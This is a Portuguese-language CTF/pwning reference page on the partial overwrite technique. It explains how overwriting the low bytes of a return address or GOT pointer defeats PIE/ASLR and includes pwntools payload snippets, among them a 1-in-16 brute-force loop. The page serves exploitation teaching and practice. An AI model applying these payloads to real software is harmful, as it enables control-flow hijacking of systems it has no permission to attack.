---
title: "Partial Overwrite"
sidebar_position: 8
---

Com PIE/ASLR, os 12 bits baixos (3 últimos dígitos hex) de qualquer endereço **não mudam** (randomização por página). Se um endereço na stack já aponta para o lugar certo e o alvo está perto, sobrescreva só os bytes baixos, sem precisar de leak. Teoria em [Partial Overwrite](../../../pwning/stack/rop/partial-overwrite.mdx).

Cenário típico: o return address aponta para dentro do binário (ex: `main+0x5a`) e a função `win` está a poucos bytes de distância. Sobrescreva só o **último byte**:

```py
payload = b'A' * offset + b'\xf6'      # troca ...1da por ...1f6. Use send(), não sendline()
p.send(payload)
```

Regras:

- **1 byte** (alvo e original na mesma página de `0x100`): determinístico. Veja no GDB o return address original (`telescope $rsp` no crash) e o endereço do alvo, e confira se só o último byte muda.
- **2 bytes**: só os 12 bits baixos são fixos, então 1 dígito hex (4 bits) é aleatório: 1 chance em 16. Repita o exploit em loop até funcionar.
- O input **não pode adicionar `\n`/`\0`** depois do byte (`read` serve, `gets`/`fgets`/`scanf` não), e o overflow precisa parar exatamente ali.
- Funciona também em ponteiros da **GOT** (trocar `puts` por `system` quando estão perto na libc) e em ponteiros da heap.

```py
# 2 bytes: brute force (1 chance em 16 por tentativa)
while True:
    p = process()
    p.send(b'A' * offset + p16(0x51f6))     # palpite fixo para o dígito aleatório
    p.sendline(b'cat flag.txt')
    try:
        print(p.recvline(timeout=1)); break
    except EOFError:
        p.close()
```
